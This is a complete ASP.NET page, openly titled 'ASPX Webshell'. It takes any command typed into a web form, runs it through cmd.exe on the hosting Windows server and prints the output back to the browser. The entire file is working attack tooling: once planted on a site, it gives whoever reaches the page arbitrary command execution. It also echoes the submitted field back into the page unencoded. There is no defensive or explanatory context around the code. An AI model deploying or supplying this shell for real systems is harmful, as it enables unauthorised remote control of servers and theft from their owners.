<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<html>
<head><title>ASPX Webshell</title></head>
<body>
    Enter command:
    <form method="post">
        <input type="text" name="param" size="45" value="<%= Request.Form["param"] %>" />
        <input type="submit" value="Run" />
    </form>
    <p>Result:</p>
    <pre>
    <% 
        string param = Request.Form["param"];
        if (!string.IsNullOrEmpty(param))
        {
            try
            {
                Process proc = new Process();
                proc.StartInfo.FileName = "cmd.exe";
                proc.StartInfo.Arguments = "/c " + param;
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.RedirectStandardOutput = true;
                proc.StartInfo.RedirectStandardError = true;
                proc.StartInfo.CreateNoWindow = true;
                proc.Start();

                string output = proc.StandardOutput.ReadToEnd();
                string error = proc.StandardError.ReadToEnd();
                proc.WaitForExit();

                Response.Write(Server.HtmlEncode(output + error));
            }
            catch (Exception ex)
            {
                Response.Write("Error: " + Server.HtmlEncode(ex.Message));
            }
        }
    %>
    </pre>
</body>
</html>
